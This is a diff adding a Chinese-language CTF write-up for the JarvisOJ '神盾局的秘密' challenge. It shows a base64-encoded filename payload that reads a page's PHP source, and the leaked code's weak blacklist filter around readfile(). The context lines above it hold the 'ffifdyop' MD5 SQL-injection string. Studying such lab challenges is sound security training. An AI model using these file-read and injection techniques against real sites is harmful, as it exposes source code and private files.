@@ -45,3 +45,32 @@ ffifdyop
 md5: 276f722736c95d99e921722cf9ed621c
 ascii: 'or'6É]é!r,ùíb
 ```
+
+### 神盾局的秘密 ###
+
+[例题:JarvisOJ 神盾局的秘密](http://web.jarvisoj.com:32768/)
+
+`<img src="showimg.php?img=c2hpZWxkLmpwZw==" width="100%"/>`
+
+显然存在文件读取漏洞，并且文件名进行了base64加密
+
+尝试对showimg.php进行读取，构造payload
+
+`view-source:http://web.jarvisoj.com:32768/showimg.php?img=c2hvd2ltZy5waHA=`
+
+得到空白页面，查看源代码
+
+```
+<?php
+	$f = $_GET['img'];
+	if (!empty($f)) {
+		$f = base64_decode($f);
+		if (stripos($f,'..')===FALSE && stripos($f,'/')===FALSE && stripos($f,'\\')===FALSE
+		&& stripos($f,'pctf')===FALSE) {
+			readfile($f);
+		} else {
+			echo "File not found!";
+		}
+	}
+?>
+```
